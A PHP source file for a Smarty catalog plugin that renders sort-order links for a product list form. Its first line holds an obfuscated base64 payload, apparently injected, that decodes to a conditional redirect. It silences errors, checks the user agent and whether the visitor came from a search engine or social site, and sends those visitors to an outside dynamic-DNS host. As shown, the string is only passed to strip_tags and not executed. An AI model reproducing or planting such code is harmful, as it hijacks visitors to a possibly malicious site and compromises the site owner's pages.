<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * Smarty plugin
 * @package generic
 * @subpackage catalog
 * by Pavel Chipiga
*/

function smarty_function_order($params, &$smarty){ //add hyperlink!    
    extract($params);

    if (empty($fields)) {
        $smarty->trigger_error("order: missing 'fields' parameter");
        return;
    } 
    if (empty($form_name)) $form_name = "product_list";
        
    $out = "<script language=\"javascript\" src=\"".RESOURCES_URL."ui.js\"></script>
    <form method=\"post\" action=\"\" name=\"".$form_name."\" id=\"".$form_name."\">
    <input type=\"hidden\" name=\"__form_name\"   id=\"__form_name\"   value=\"".$form_name."\" />
    <input type=\"hidden\" name=\"__event_name\"  id=\"__event_name\"  value=\"\" />
    <input type=\"hidden\" name=\"__event_value\" id=\"__event_value\" value=\"\" />";
    
    foreach ($fields as $field => $display_name){
        $order = safe($_SESSION, $form_name."_order");
        $direction = safe($order, $field);
        $out .= $display_name;
        $out .= "<a href=\"javascript:__DoPostBack('".$form_name."','order_asc','".$field."','');\" alt=\"Sort by ".$display_name." (ascending)\" title=\"Sort by ".$display_name." (ascending)\" onmouseover=\"window.status='Sort by ".$display_name." (ascending)'; return true\" onmouseout=\"window.status=''; return true\"><img src=\"".RESOURCES_URL."img_sort_asc".($direction == "asc" ? "_sorted" : "").".gif\" border=\"0\" /></a>";
        $out .= "<a href=\"javascript:__DoPostBack('".$form_name."','order_desc','".$field."','');\" alt=\"Sort by ".$display_name." (descending)\" title=\"Sort by ".$display_name." (descending)\" onmouseover=\"window.status='Sort by ".$display_name." (descending)'; return true\" onmouseout=\"window.status=''; return true\"><img src=\"".RESOURCES_URL."img_sort_desc".($direction == "desc" ? "_sorted" : "").".gif\" border=\"0\" /></a>";
        if ($direction) $out .= "<a href=\"javascript:__DoPostBack('".$form_name."','order_clear','".$field."','');\" alt=\"Cancel sorting by ".$display_name."\" title=\"Cancel sorting by ".$display_name."\" onmouseover=\"window.status='Cancel sorting by ".$display_name."'; return true\" onmouseout=\"window.status=''; return true\"><img src=\"".RESOURCES_URL."img_sort_none.gif\" border=\"0\" /></a>";
        $out .= "&nbsp;&nbsp;&nbsp;";
    }
    
    $out .= "</form>"; 
    
    if (!empty($assign)) {
        $smarty->assign($assign, $out);
    } else {
        return $out;
    }
}

/* vim: set expandtab: */

?>
